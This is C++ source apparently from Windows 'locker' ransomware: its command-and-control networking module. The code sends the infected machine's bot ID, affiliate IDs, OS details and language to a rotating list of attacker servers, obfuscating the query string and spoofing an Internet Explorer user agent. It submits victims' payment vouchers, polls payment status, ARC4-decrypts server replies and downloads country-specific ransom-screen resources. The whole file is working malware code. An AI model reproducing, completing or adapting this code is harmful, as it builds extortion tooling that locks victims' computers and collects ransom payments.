zgui_ImplementSingleton(LockerServerNetcomm)

const wchar_t* const LockerServerNetcomm::_httpRequest = L"GET /security?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT %d.%d;%s Trident/5.0)\r\nAccept: text/html,application/xhtml+xml,application/xml,*/*\r\nConnection: close\r\n\r\n";
const wchar_t* const LockerServerNetcomm::_httpResRequest = L"GET /res/%s.zrc HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT %d.%d;%s Trident/5.0)\r\nAccept: */*\r\nConnection: close\r\n\r\n";
//char LockerServerNetcomm::gBuffer[BUFF_SIZE];

LockerServerNetcomm::LockerServerNetcomm() :
_port(80)
{
    _host = LockerConfig::getInstance()->servers[0];

    StreamingSocket::initSockets();
}

LockerServerNetcomm::~LockerServerNetcomm()
{
    StreamingSocket::doneSockets();
}

void LockerServerNetcomm::nextHost()
{
    LockerConfig* pCfg = LockerConfig::getInstance();

    if (++pCfg->currentServer == pCfg->servers.size()) {
        pCfg->currentServer = 0;
    }
    _host = pCfg->servers[pCfg->currentServer];
}

bool LockerServerNetcomm::makeTransaction(int type)
{
    bool ret = false;
    zgui::String data;
    uint8_t sData[512];
    zgui::String httpRequest;
    StreamingSocket sock;
    LockerConfig* pCfg = LockerConfig::getInstance();
    int dataLen, i;
    ULONG seed = GetTickCount();

    do {
        uint32_t osVer;
        osVer = (int)(((pCfg->osMajorVer & 0x0f) | ((pCfg->osMinorVer & 0x0f) << 4)) + (int)pCfg->osProductType + pCfg->osIs64);
        osVer |= (pCfg->osSp & 0x0f) << 8;

        if (type == GetInfo) {
            data = zgui::String::formatted(L"%s;%d;%u.%u.%u.%u", pCfg->botId.toWideCharPointer(), type, pCfg->affId, pCfg->subId, osVer, pCfg->sysLangId);
        }
        else if (type == SendVoucher) {
            data = zgui::String::formatted(L"%s;%d;%d.%s", pCfg->botId.toWideCharPointer(), type, pCfg->activeVoucherType, pCfg->activeVoucher.toWideCharPointer());
        }
        else if (type == CheckStatus) {
            data = zgui::String::formatted(L"%s;%d;%d", pCfg->botId.toWideCharPointer(), type, pCfg->waitTimeout);
        }

        if (type != LoadRes) {
            dataLen = data.length() + 1;
            data.copyToUTF8((zgui::CharPointer_UTF8::CharType*)sData, sizeof(sData));
            //pCfg->arc4_crypt_self(sData, dataLen);

//             // Заполняем случайными данными.
//             int rndSize = 9 + (RtlRandomEx(&seed) % 17);
//             for (i = 0; i < rndSize; ++i) {
//                 sData[dataLen++] = char(uint32_t(RtlRandomEx(&seed)) % 256);
//             }

            // Конвертируем в текстовое представление.
            static const char chs1[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'E', 'f'};
            static const char chs2[16] = {'Z', 'x', 'y', 'Y', 'i', 'j', 'q', 'm', 'S', 'p', 'N', 'M', 'I', 'O', 'h', 'w'};

            zgui::String query;
            int rndSize = 1 + (RtlRandomEx(&seed) % (dataLen / 2));
            for (i = 0; i < dataLen; ++i) {
                const char* rndTable = (RtlRandomEx(&seed) % 2 ? chs1 : chs2);
                query += rndTable[sData[i] & 0x0F];
                rndTable = (RtlRandomEx(&seed) % 2 ? chs1 : chs2);
                query += rndTable[(sData[i] >> 4) & 0x0F];

                if (i == rndSize) {
                    query += '=';
                }
            }

            httpRequest = zgui::String::formatted(_httpRequest, query.toWideCharPointer(), pCfg->servers[pCfg->currentServer].toWideCharPointer(), pCfg->osMajorVer, pCfg->osMinorVer, (pCfg->osIs64 == 1) ? L" Win64; x64;" : L"");
            //_snprintf(httpRequest, sizeof(httpRequest), _httpRequest, query.getCharPointer(), pCfg->servers[pCfg->currentServer], pCfg->osMajorVer, pCfg->osMinorVer, (pCfg->osIs64 == 1) ? " Win64; x64;" : "");
        }
        else {
            httpRequest = zgui::String::formatted(_httpResRequest, pCfg->botCountryCode.toWideCharPointer(), pCfg->servers[pCfg->currentServer].toWideCharPointer(), pCfg->osMajorVer, pCfg->osMinorVer, (pCfg->osIs64 == 1) ? L" Win64; x64;" : L"");
            //_snprintf(httpRequest, sizeof(httpRequest), _httpResRequest, pCfg->botCountryCode.getCharPointer(), pCfg->servers[pCfg->currentServer], pCfg->osMajorVer, pCfg->osMinorVer, (pCfg->osIs64 == 1) ? " Win64; x64;" : "");
        }

        ret = sock.connect(_host, _port);
        if (!ret) {
            break;
        }
        ret = false;

        dataLen = sock.write(httpRequest.toUTF8(), httpRequest.length());
        if (dataLen == -1) {
            break;
        }
        zgui::MemoryBlock serverData;
        uint8_t buff[256];
        int currentSize = 0;
        int readed;
        
        while ((readed = sock.read(buff, sizeof(buff), false)) != -1) {
            serverData.setSize(readed + serverData.getSize());
            memcpy((char*)serverData.getData() + currentSize, buff, readed);
            currentSize = serverData.getSize();
        }
//         if (!makeTransactionInternal(_host.toUTF8(), _port, httpRequest, (uint32)lstrlenA(httpRequest), serverData)) {
//             break;
//         }

        zgui::MemoryBlock botData;
        if (!parseHTTPResponse(serverData, botData)) {
            break;
        }

        if (type != LoadRes) {
            if (botData.getSize() < 64) {
                break;
            }

            pCfg->arc4_crypt_self((uint8_t*)botData.getData(), botData.getSize());

            if (memcmp(botData.getData(), pCfg->botId.toUTF8(), 64) != 0) {
                return false;
            }

            zgui::String myInfo = zgui::String::fromUTF8((const char*)botData.getData() + 64, botData.getSize() - 64);

            if (type == GetInfo) {
                ret = pCfg->parseNodeParams(myInfo);
            }
            else if (type == SendVoucher) {
                ret = pCfg->parseVoucherStatus(myInfo);
            }
            else if (type == CheckStatus) {
                ret = pCfg->parseVouchersInfo(myInfo);
            }
        }
        else {
            LockerConfig::getInstance()->_srvResources.setSize(botData.getSize());
            LockerConfig::getInstance()->_srvResources.copyFrom(botData.getData(), 0, botData.getSize());
            zgui::Resources::getInstance()->addSource(static_cast<uint8_t*>(LockerConfig::getInstance()->_srvResources.getData()), LockerConfig::getInstance()->_srvResources.getSize());
            ret = true;
        }
    } while(0);

    sock.close();

    return ret;
}

bool LockerServerNetcomm::parseHTTPResponse(const zgui::MemoryBlock& http, zgui::MemoryBlock& data)
{
    char sHttpCode[4];
    char* itr = (char*)http.getData();
    char* end = itr + http.getSize();
    char* hdrEnd = end;
    char* contLen;
    bool contentLenFound = false;
    bool ret = false;
    uint16_t httpCode;

    while (itr < end && *itr != ' ') {
        itr++;
    }

    if (itr + 7 < end) {
        sHttpCode[0] = *(++itr);
        sHttpCode[1] = *(++itr);
        sHttpCode[2] = *(++itr);
        sHttpCode[3] = 0;
        httpCode = (uint16_t)zgui::String(sHttpCode).getIntValue();

        if ((httpCode & 0xC8) == 0xC8) { // код ошибки 2xx
            itr += 2;

            // Ищем конец заголовка
            while (itr < end) {
                if ((itr + 3 < hdrEnd) && *itr == '\r') {
                    if (*(itr + 1) == '\n' && *(itr + 2) == '\r' && *(itr + 3) == '\n') {
                        hdrEnd = itr + 4;
                        break;
                    }
                }
                itr++;
            }

            itr = (char*)http.getData();

            while (itr < hdrEnd) {
                if ((itr + 8 < hdrEnd) && *itr == 'C') {
                    if (*(itr + 1) == 'o' && *(itr + 2) == 'n' && *(itr + 3) == 't' && *(itr + 4) == 'e' && *(itr + 5) == 'n' && *(itr + 6) == 't' && *(itr + 7) == '-') {
                        itr += 8;
                        if ((itr + 7 < hdrEnd) && *itr == 'L') {
                            if (*(itr + 1) == 'e' && *(itr + 2) == 'n' && *(itr + 3) == 'g' && *(itr + 4) == 't' && *(itr + 5) == 'h' && *(itr + 6) == ':') {
                                itr += 7;
                                contentLenFound = TRUE;
                                break;
                            }
                        }
                    }
                }
                itr++;
            }

            if (itr < hdrEnd && contentLenFound) {
                while (itr < hdrEnd && *itr == ' ') {
                    itr++;
                }

                contLen = itr;
                while (itr < hdrEnd && *itr != '\r') {
                    itr++;
                }
                *itr = '\0';

                itr += 2;
                data.setSize(zgui::String(contLen).getIntValue());
            }

            memcpy(data.getData(), hdrEnd, data.getSize());
            ret = true;
        }
    }

    return ret;
}
